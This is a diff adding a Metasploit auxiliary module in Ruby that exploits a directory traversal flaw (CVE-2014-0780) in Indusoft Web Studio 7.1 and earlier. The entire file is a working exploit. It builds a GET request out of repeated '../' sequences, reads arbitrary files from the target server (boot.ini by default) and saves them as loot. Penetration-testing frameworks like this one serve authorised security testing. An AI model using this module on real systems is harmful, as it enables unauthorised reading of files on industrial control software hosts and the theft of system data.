@@ -1,0 +1,59 @@
+require 'msf/core'
+
+class MetasploitModule < Msf::Auxiliary
+	Rank = GreatRanking
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Indusoft Web Studio Directory Traversal',
+			'Description'    => %q{
+				This module exploits a flaw found in Indusoft Web Studio
+				<= 7.1 before SP2 Patch 4. This specific flaw allows users
+				to browse outside of the webroot to download files found
+				on the underlying system
+			},
+			'Author'         => [ 'James Fitts' ],
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision: $',
+			'References'     =>
+				[
+					[ 'CVE', '2014-0780' ],
+					[ 'ZDI', '14-118/' ],
+					[ 'URL', 'http://ics-cert.us-cert.gov/advisories/ICSA-14-107-02']
+				],
+			'DisclosureDate' => 'Jan 18 2013'))
+
+		register_options(
+			[
+				OptInt.new('DEPTH', [ false, 'Levels to reach base directory', 8]),
+				OptString.new('FILE', [ false, 'This is the file to download', 'boot.ini']),
+				Opt::RPORT(80)
+			], self.class )
+	end
+
+	def run
+
+	depth = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
+	levels = "/" + ("../" * depth)
+
+	res = send_request_raw({
+		'method'	=> 'GET',
+		'uri'		=> "/" + levels + datastore['FILE'],
+	})
+
+	if res and res.code == 200 and res.message =~ /Sending file/
+		loot = res.body
+		if not loot or loot.empty?
+			print_status("File from #{rhost}:#{rport} is empty...")
+			return
+		end
+		file = ::File.basename(datastore['FILE'])
+		path = store_loot('indusoft.webstudio.file', 'application/octet-stream', rhost, loot, file, datastore['FILE'])
+		print_status("Stored #{datastore['FILE']} to #{path}")
+		return
+	end
+
+	end
+end
